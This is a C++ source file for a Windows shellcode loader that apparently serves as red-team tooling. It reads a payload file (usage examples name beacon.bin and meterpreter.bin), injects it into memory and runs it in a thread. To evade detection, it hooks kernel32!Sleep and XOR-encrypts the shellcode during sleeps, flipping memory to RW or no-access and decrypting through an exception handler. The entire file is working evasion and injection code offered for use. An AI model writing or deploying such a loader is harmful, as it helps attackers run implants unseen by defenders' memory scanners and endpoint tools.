#include "header.h"
#include <intrin.h>
#include <random>

// Global state
HookedSleep g_hookedSleep = { 0 };
FluctuationMetadata g_fluctuationData = { 0 };
TypeOfFluctuation g_fluctuate = NoFluctuation;

/**
 * @brief Custom Sleep handler that manages memory fluctuation
 * @param dwMilliseconds Sleep duration in milliseconds
 */
void WINAPI HookedSleepHandler(DWORD dwMilliseconds)
{
    const LPVOID caller = (LPVOID)_ReturnAddress();

    // Dynamically determine shellcode location and initialize fluctuation
    InitializeShellcodeFluctuation(caller);

    // Encrypt shellcode and flip memory pages to RW
    ShellcodeEncryptDecrypt(caller);

    Log("\n===> HookedSleepHandler(", std::dec, dwMilliseconds, ")\n");

    // Prepare buffers for unhooking
    HookTrampolineBuffers buffers = { 0 };
    buffers.originalBytes = g_hookedSleep.sleepStub;
    buffers.originalBytesSize = sizeof(g_hookedSleep.sleepStub);

    // Temporarily unhook Sleep to evade detection
    FastTrampoline(false, (BYTE*)::Sleep, (void*)&HookedSleepHandler, &buffers);

    // Perform actual sleep
    ::Sleep(dwMilliseconds);

    if (g_fluctuate == FluctuateToRW)
    {
        // Decrypt and restore memory protection to RX
        ShellcodeEncryptDecrypt(caller);
    }
    else if (g_fluctuate == FluctuateToNA)
    {
        // For PAGE_NOACCESS, we let the exception handler manage decryption
        // This occurs when shellcode tries to execute again
    }

    // Re-hook Sleep
    FastTrampoline(true, (BYTE*)::Sleep, (void*)&HookedSleepHandler);
}

/**
 * @brief Collect memory map of specified process
 * @param hProcess Process handle
 * @param type Memory type filter
 * @return Vector of memory regions
 */
std::vector<MEMORY_BASIC_INFORMATION> CollectMemoryMap(HANDLE hProcess, DWORD type)
{
    std::vector<MEMORY_BASIC_INFORMATION> memoryRegions;
    const size_t maxAddress = (sizeof(ULONG_PTR) == 4)
        ? ((1ULL << 31) - 1)
        : ((1ULL << 63) - 1);

    uint8_t* currentAddress = nullptr;

    while (reinterpret_cast<size_t>(currentAddress) < maxAddress)
    {
        MEMORY_BASIC_INFORMATION mbi = { 0 };

        if (!VirtualQueryEx(hProcess, currentAddress, &mbi, sizeof(mbi)))
        {
            break;
        }

        // Filter for executable/writable regions of specified type
        if ((mbi.Protect == PAGE_EXECUTE_READWRITE
            || mbi.Protect == PAGE_EXECUTE_READ
            || mbi.Protect == PAGE_READWRITE)
            && ((mbi.Type & type) != 0))
        {
            memoryRegions.push_back(mbi);
        }

        currentAddress += mbi.RegionSize;
    }

    return memoryRegions;
}

/**
 * @brief Initialize shellcode fluctuation metadata
 * @param caller Address of caller (should be within shellcode)
 */
void InitializeShellcodeFluctuation(const LPVOID caller)
{
    if (g_fluctuate == NoFluctuation
        || g_fluctuationData.shellcodeAddr != nullptr
        || !IsShellcodeThread(caller))
    {
        return;
    }

    auto memoryMap = CollectMemoryMap(GetCurrentProcess());

    // Find memory allocation containing the caller
    for (const auto& mbi : memoryMap)
    {
        uintptr_t baseAddr = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t endAddr = baseAddr + mbi.RegionSize;
        uintptr_t callerAddr = reinterpret_cast<uintptr_t>(caller);

        if (callerAddr >= baseAddr && callerAddr < endAddr)
        {
            // Store shellcode memory boundaries
            g_fluctuationData.shellcodeAddr = mbi.BaseAddress;
            g_fluctuationData.shellcodeSize = mbi.RegionSize;
            g_fluctuationData.currentlyEncrypted = false;

            // Generate random 32-bit XOR key
            std::random_device randomDevice;
            std::mt19937 rng(randomDevice());
            std::uniform_int_distribution<uint32_t> distribution(0, 0xFFFFFFFF);
            g_fluctuationData.encodeKey = distribution(rng);

            Log("[+] Fluctuation initialized.");
            Log("    Shellcode at 0x",
                std::hex, std::setw(8), std::setfill('0'), mbi.BaseAddress,
                " | Size: ", std::dec, mbi.RegionSize, " bytes",
                " | XOR32 key: 0x", std::hex, std::setw(8), std::setfill('0'),
                g_fluctuationData.encodeKey, "\n");

            return;
        }
    }

    Log("[!] Could not initialize shellcode fluctuation!");
    ::ExitProcess(1);
}

/**
 * @brief XOR encrypt/decrypt buffer with 32-bit key
 * @param buffer Buffer to encrypt/decrypt
 * @param bufferSize Size of buffer
 * @param xorKey 32-bit XOR key
 */
void XOR32Encode(uint8_t* buffer, size_t bufferSize, uint32_t xorKey)
{
    if (!buffer || bufferSize == 0)
    {
        return;
    }

    uint32_t* buffer32 = reinterpret_cast<uint32_t*>(buffer);
    size_t dwordCount = (bufferSize - (bufferSize % sizeof(uint32_t))) / 4;

    // Process 4-byte chunks
    for (size_t i = 0; i < dwordCount; ++i)
    {
        buffer32[i] ^= xorKey;
    }

    // Process remaining bytes
    for (size_t i = 4 * dwordCount; i < bufferSize; ++i)
    {
        buffer[i] ^= static_cast<uint8_t>(xorKey & 0xFF);
    }
}

/**
 * @brief Check if address belongs to shellcode thread
 * @param address Address to check
 * @return true if address is in shellcode region
 */
bool IsShellcodeThread(LPVOID address)
{
    MEMORY_BASIC_INFORMATION mbi = { 0 };

    if (!VirtualQuery(address, &mbi, sizeof(mbi)))
    {
        return false;
    }

    // MEM_PRIVATE indicates dynamic allocation (VirtualAlloc)
    if (mbi.Type != MEM_PRIVATE)
    {
        return false;
    }

    const DWORD expectedProtection = (g_fluctuate == FluctuateToRW)
        ? PAGE_READWRITE
        : PAGE_NOACCESS;

    return ((mbi.Protect & PAGE_EXECUTE_READ)
        || (mbi.Protect & PAGE_EXECUTE_READWRITE)
        || (mbi.Protect & expectedProtection));
}

/**
 * @brief Install or remove function hook using trampoline
 * @param installHook true to install, false to remove
 * @param addressToHook Address of function to hook
 * @param jumpAddress Address to jump to
 * @param buffers Buffer management structure
 * @return true if successful
 */
bool FastTrampoline(
    bool installHook,
    BYTE* addressToHook,
    LPVOID jumpAddress,
    HookTrampolineBuffers* buffers)
{
#ifdef _WIN64
    uint8_t trampoline[] = {
        0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
        0x41, 0xFF, 0xE2                                            // jmp r10
    };
    uint64_t addr = reinterpret_cast<uint64_t>(jumpAddress);
    memcpy(&trampoline[2], &addr, sizeof(addr));
#else
    uint8_t trampoline[] = {
        0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, addr
        0xFF, 0xE0                        // jmp eax
    };
    uint32_t addr = reinterpret_cast<uint32_t>(jumpAddress);
    memcpy(&trampoline[1], &addr, sizeof(addr));
#endif

    DWORD trampolineSize = sizeof(trampoline);
    DWORD oldProtection = 0;
    bool success = false;

    if (installHook)
    {
        // Save original bytes before hooking
        if (buffers && buffers->previousBytes && buffers->previousBytesSize > 0)
        {
            memcpy(buffers->previousBytes, addressToHook, buffers->previousBytesSize);
        }

        if (::VirtualProtect(addressToHook, trampolineSize, PAGE_EXECUTE_READWRITE, &oldProtection))
        {
            memcpy(addressToHook, trampoline, trampolineSize);
            success = true;
        }
    }
    else
    {
        // Restore original bytes when unhooking
        if (!buffers || !buffers->originalBytes || buffers->originalBytesSize == 0)
        {
            return false;
        }

        trampolineSize = buffers->originalBytesSize;

        if (::VirtualProtect(addressToHook, trampolineSize, PAGE_EXECUTE_READWRITE, &oldProtection))
        {
            memcpy(addressToHook, buffers->originalBytes, trampolineSize);
            success = true;
        }
    }

    // Flush instruction cache
    static FnNtFlushInstructionCache pNtFlushInstructionCache = nullptr;
    if (!pNtFlushInstructionCache)
    {
        pNtFlushInstructionCache = reinterpret_cast<FnNtFlushInstructionCache>(
            GetProcAddress(GetModuleHandleA("ntdll"), "NtFlushInstructionCache")
            );
    }

    if (pNtFlushInstructionCache)
    {
        pNtFlushInstructionCache(GetCurrentProcess(), addressToHook, trampolineSize);
    }

    // Restore original protection
    ::VirtualProtect(addressToHook, trampolineSize, oldProtection, &oldProtection);

    return success;
}

/**
 * @brief Hook kernel32!Sleep function
 * @return true if successful
 */
bool HookSleepFunction()
{
    HookTrampolineBuffers buffers = { 0 };
    buffers.previousBytes = g_hookedSleep.sleepStub;
    buffers.previousBytesSize = sizeof(g_hookedSleep.sleepStub);

    g_hookedSleep.originalSleep = reinterpret_cast<FnSleep>(::Sleep);

    return FastTrampoline(true, (BYTE*)::Sleep, (void*)&HookedSleepHandler, &buffers);
}

/**
 * @brief Encrypt or decrypt shellcode memory
 * @param callerAddress Address of caller
 */
void ShellcodeEncryptDecrypt(LPVOID callerAddress)
{
    if (g_fluctuate == NoFluctuation
        || !g_fluctuationData.shellcodeAddr
        || g_fluctuationData.shellcodeSize == 0)
    {
        return;
    }

    if (!IsShellcodeThread(callerAddress))
    {
        return;
    }

    DWORD oldProtection = 0;

    // Change to RW if currently encrypted or using PAGE_NOACCESS
    if (!g_fluctuationData.currentlyEncrypted
        || (g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA))
    {
        ::VirtualProtect(
            g_fluctuationData.shellcodeAddr,
            g_fluctuationData.shellcodeSize,
            PAGE_READWRITE,
            &g_fluctuationData.protect
        );

        Log("[>] Memory protection changed to RW");
    }

    Log(g_fluctuationData.currentlyEncrypted ? "[<] Decrypting..." : "[>] Encrypting...");

    // Perform XOR encryption/decryption
    XOR32Encode(
        reinterpret_cast<uint8_t*>(g_fluctuationData.shellcodeAddr),
        g_fluctuationData.shellcodeSize,
        g_fluctuationData.encodeKey
    );

    // Set final memory protection
    if (!g_fluctuationData.currentlyEncrypted && g_fluctuate == FluctuateToNA)
    {
        // ORCA666's technique: mark as PAGE_NOACCESS
        ::VirtualProtect(
            g_fluctuationData.shellcodeAddr,
            g_fluctuationData.shellcodeSize,
            PAGE_NOACCESS,
            &oldProtection
        );

        Log("[>] Memory protection changed to NO ACCESS\n");
    }
    else if (g_fluctuationData.currentlyEncrypted)
    {
        // Restore original protection (RX/RWX)
        ::VirtualProtect(
            g_fluctuationData.shellcodeAddr,
            g_fluctuationData.shellcodeSize,
            g_fluctuationData.protect,
            &oldProtection
        );

        Log("[<] Memory protection restored to RX/RWX\n");
    }

    g_fluctuationData.currentlyEncrypted = !g_fluctuationData.currentlyEncrypted;
}

/**
 * @brief Vectored Exception Handler for PAGE_NOACCESS technique
 * @param exceptionInfo Exception information
 * @return Exception handling disposition
 */
LONG NTAPI VectoredExceptionHandler(PEXCEPTION_POINTERS exceptionInfo)
{
    if (exceptionInfo->ExceptionRecord->ExceptionCode != 0xC0000005) // ACCESS_VIOLATION
    {
        Log("[.] Unhandled exception occurred (not ACCESS_VIOLATION)");
        return EXCEPTION_CONTINUE_SEARCH;
    }

#ifdef _WIN64
    ULONG_PTR instructionPointer = exceptionInfo->ContextRecord->Rip;
#else
    ULONG_PTR instructionPointer = exceptionInfo->ContextRecord->Eip;
#endif

    Log("[.] Access violation at 0x",
        std::hex, std::setw(8), std::setfill('0'), instructionPointer);

    // Check if exception occurred within shellcode region
    ULONG_PTR shellcodeStart = reinterpret_cast<ULONG_PTR>(g_fluctuationData.shellcodeAddr);
    ULONG_PTR shellcodeEnd = shellcodeStart + g_fluctuationData.shellcodeSize;

    if (instructionPointer >= shellcodeStart && instructionPointer <= shellcodeEnd)
    {
        Log("[+] Shellcode attempting execution - decrypting and restoring RX\n");

        // Decrypt and restore execution permissions
        ShellcodeEncryptDecrypt(reinterpret_cast<LPVOID>(instructionPointer));

        // Continue execution
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

/**
 * @brief Read shellcode from file
 * @param path File path
 * @param shellcode Output vector for shellcode bytes
 * @return true if successful
 */
bool ReadShellcodeFromFile(const char* path, std::vector<uint8_t>& shellcode)
{
    HandlePtr file(
        CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr),
        &::CloseHandle
    );

    if (file.get() == INVALID_HANDLE_VALUE)
    {
        return false;
    }

    DWORD highSize = 0;
    DWORD lowSize = GetFileSize(file.get(), &highSize);

    if (lowSize == INVALID_FILE_SIZE)
    {
        return false;
    }

    shellcode.resize(lowSize, 0);

    DWORD bytesRead = 0;
    return ReadFile(file.get(), shellcode.data(), lowSize, &bytesRead, nullptr) && (bytesRead == lowSize);
}

/**
 * @brief Execute shellcode
 * @param shellcodeAddress Address of shellcode
 */
void ExecuteShellcode(LPVOID shellcodeAddress)
{
    auto shellcodeFunc = reinterpret_cast<void(*)()>(shellcodeAddress);
    shellcodeFunc();
}

/**
 * @brief Inject shellcode into memory and create execution thread
 * @param shellcode Shellcode bytes
 * @param thread Output handle for created thread
 * @return true if successful
 */
bool InjectShellcode(std::vector<uint8_t>& shellcode, HandlePtr& thread)
{
    // Allocate RW memory (avoid RWX IOC)
    LPVOID allocation = ::VirtualAlloc(
        nullptr,
        shellcode.size() + 1,
        MEM_COMMIT,
        PAGE_READWRITE
    );

    if (!allocation)
    {
        return false;
    }

    // Copy shellcode to allocated memory
    memcpy(allocation, shellcode.data(), shellcode.size());

    // Change protection to RX
    DWORD oldProtection;
    if (!VirtualProtect(allocation, shellcode.size() + 1, SHELLCODE_MEMORY_PROTECTION, &oldProtection))
    {
        VirtualFree(allocation, 0, MEM_RELEASE);
        return false;
    }

    // Clear original shellcode from memory
    shellcode.clear();

    // Create thread to execute shellcode
    thread.reset(::CreateThread(
        nullptr,
        0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(ExecuteShellcode),
        allocation,
        0,
        nullptr
    ));

    return (thread.get() != nullptr);
}

/**
 * @brief Display usage information
 */
void DisplayUsage(const char* programName)
{
    Log("Usage: ", programName, " <shellcode_file> <fluctuation_mode>");
    Log("\nFluctuation Modes:");
    Log("  -1 : Read shellcode without injection (infinite loop for analysis)");
    Log("   0 : Inject shellcode without hooking or encryption");
    Log("   1 : Inject and fluctuate memory with PAGE_READWRITE");
    Log("   2 : Inject and fluctuate memory with PAGE_NOACCESS (ORCA666's technique)");
    Log("\nExamples:");
    Log("  ", programName, " beacon.bin 1");
    Log("  ", programName, " meterpreter.bin 2");
}

/**
 * @brief Main entry point
 */
int main(int argc, char** argv)
{
    if (argc < 3)
    {
        DisplayUsage(argv[0]);
        return 1;
    }

    std::vector<uint8_t> shellcode;

    // Parse fluctuation mode
    try
    {
        int mode = atoi(argv[2]);
        if (mode < -1 || mode > 2)
        {
            Log("[!] Invalid fluctuation mode. Must be -1, 0, 1, or 2");
            return 1;
        }
        g_fluctuate = static_cast<TypeOfFluctuation>(mode);
    }
    catch (...)
    {
        Log("[!] Invalid fluctuation mode provided");
        return 1;
    }

    // Read shellcode from file
    Log("[*] Reading shellcode from: ", argv[1]);
    if (!ReadShellcodeFromFile(argv[1], shellcode))
    {
        Log("[!] Failed to read shellcode file. Error: ", ::GetLastError());
        return 1;
    }

    Log("[+] Shellcode loaded: ", shellcode.size(), " bytes");

    // Hook Sleep if fluctuation is enabled
    if (g_fluctuate != NoFluctuation)
    {
        Log("[*] Hooking kernel32!Sleep...");
        if (!HookSleepFunction())
        {
            Log("[!] Failed to hook kernel32!Sleep");
            return 1;
        }
        Log("[+] kernel32!Sleep hooked successfully");
    }
    else
    {
        Log("[*] Memory fluctuation disabled");
    }

    // Handle test mode (no injection)
    if (g_fluctuate == static_cast<TypeOfFluctuation>(-1))
    {
        Log("[*] Entering infinite loop for memory analysis");
        Log("[*] PID: ", std::dec, GetCurrentProcessId());
        while (true)
        {
            Sleep(1000);
        }
    }

    // Setup VEH for PAGE_NOACCESS technique
    if (g_fluctuate == FluctuateToNA)
    {
        Log("\n[*] Installing Vectored Exception Handler for PAGE_NOACCESS technique");
        Log("    Based on ORCA666's work: https://github.com/ORCA666/0x41\n");
        AddVectoredExceptionHandler(1, &VectoredExceptionHandler);
    }

    // Inject and execute shellcode
    Log("[*] Injecting shellcode...");

    HandlePtr thread(nullptr, &::CloseHandle);
    if (!InjectShellcode(shellcode, thread))
    {
        Log("[!] Shellcode injection failed. Error: ", ::GetLastError());
        return 1;
    }

    Log("[+] Shellcode injected and running");
    Log("[+] Process ID: ", std::dec, GetCurrentProcessId());
    Log("[*] Waiting for shellcode to complete...\n");

    WaitForSingleObject(thread.get(), INFINITE);

    Log("\n[+] Shellcode execution completed");
    return 0;
}